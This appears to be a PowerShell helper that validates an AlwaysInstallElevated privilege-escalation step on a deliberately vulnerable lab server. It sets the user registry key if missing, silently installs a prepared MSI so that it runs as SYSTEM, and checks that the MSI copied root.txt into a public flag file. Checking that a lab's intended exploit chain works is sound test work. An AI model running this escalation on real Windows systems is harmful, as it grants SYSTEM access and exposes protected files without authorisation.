# CysVulnServer - AlwaysInstallElevated manual validation helper.
# Run from an interactive User_Joe session (EFS callback shell or RDP).
# Canonical automated proof: scripts/validate-cysvuln-chain.sh on the host.

$ErrorActionPreference = "Continue"
$outFile = "C:\Users\Public\aie-validation-result.txt"
$flagFile = "C:\Users\Public\aie-flag.txt"
$msiSource = "C:\Users\Public\aie-validation-payload.msi"

function Write-Result {
    param([string]$Message)
    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    "$timestamp $Message" | Out-File -FilePath $outFile -Append -Encoding utf8
    Write-Host $Message
}

# Clear prior output
Remove-Item -Path $outFile -Force -ErrorAction SilentlyContinue
Remove-Item -Path $flagFile -Force -ErrorAction SilentlyContinue

Write-Result "[*] AIE Validation starting as $(whoami)..."

$failed = $false

# Preflight: assert both registry keys are set to 1
$hklmPath = "HKLM:\SOFTWARE\Policies\Microsoft\Windows\Installer"
$hkcuPath = "HKCU:\SOFTWARE\Policies\Microsoft\Windows\Installer"

$hklmVal = (Get-ItemProperty -Path $hklmPath -Name AlwaysInstallElevated -ErrorAction SilentlyContinue).AlwaysInstallElevated
$hkcuVal = (Get-ItemProperty -Path $hkcuPath -Name AlwaysInstallElevated -ErrorAction SilentlyContinue).AlwaysInstallElevated

if ($hkcuVal -ne 1) {
    Write-Result "[*] HKCU AlwaysInstallElevated missing; setting for current user"
    if (-not (Test-Path $hkcuPath)) { New-Item -Path $hkcuPath -Force | Out-Null }
    Set-ItemProperty -Path $hkcuPath -Name AlwaysInstallElevated -Value 1 -Type DWord
    $hkcuVal = 1
}

if ($hklmVal -ne 1) {
    Write-Result "[-] FAIL: HKLM AlwaysInstallElevated is not 1 (got $hklmVal)"
    $failed = $true
}
if ($hkcuVal -ne 1) {
    Write-Result "[-] FAIL: HKCU AlwaysInstallElevated is not 1 (got $hkcuVal)"
    $failed = $true
}
if ($failed) {
    "EXITCODE=1" | Out-File -FilePath $outFile -Append -Encoding utf8
    exit 1
}
Write-Result "[+] Preflight: Both AlwaysInstallElevated keys are set to 1"

# Verify MSI exists
if (-not (Test-Path $msiSource)) {
    Write-Result "[-] FAIL: Validation MSI not found at $msiSource"
    "EXITCODE=1" | Out-File -FilePath $outFile -Append -Encoding utf8
    exit 1
}

$msiDest = "$env:TEMP\aie-validation-payload.msi"
Copy-Item -Path $msiSource -Destination $msiDest -Force

# Execute the MSI as the current (low-priv) user via AlwaysInstallElevated.
# msiexec should elevate to SYSTEM because both AIE keys are set.
Write-Result "[*] Executing msiexec as $(whoami)..."
$proc = Start-Process msiexec.exe `
    -ArgumentList "/quiet /norestart /i `"$msiDest`"" `
    -Wait `
    -PassThru `
    -NoNewWindow

Write-Result "[*] msiexec exit code: $($proc.ExitCode)"

if ($proc.ExitCode -ne 0 -and $proc.ExitCode -ne 3010) {
    Write-Result "[-] FAIL: msiexec exited with code $($proc.ExitCode)"
    "EXITCODE=1" | Out-File -FilePath $outFile -Append -Encoding utf8
    exit 1
}
Write-Result "[+] msiexec completed successfully"

# Assertion: MSI ran as SYSTEM and should have copied root.txt to aie-flag.txt
if (-not (Test-Path $flagFile)) {
    Write-Result "[-] FAIL: Flag file not created at $flagFile - AIE privesc likely failed"
    "EXITCODE=1" | Out-File -FilePath $outFile -Append -Encoding utf8
    exit 1
}

$flagContent = Get-Content $flagFile -Raw -ErrorAction SilentlyContinue
if (-not $flagContent -or $flagContent.Trim().Length -eq 0) {
    Write-Result "[-] FAIL: Flag file exists but is empty"
    "EXITCODE=1" | Out-File -FilePath $outFile -Append -Encoding utf8
    exit 1
}

Write-Result "[+] AIE privesc confirmed: MSI executed as SYSTEM and produced flag"
Write-Result "[+] Flag content: $($flagContent.Trim())"
Write-Result "[+] Exploit Successful"

"EXITCODE=0" | Out-File -FilePath $outFile -Append -Encoding utf8
exit 0
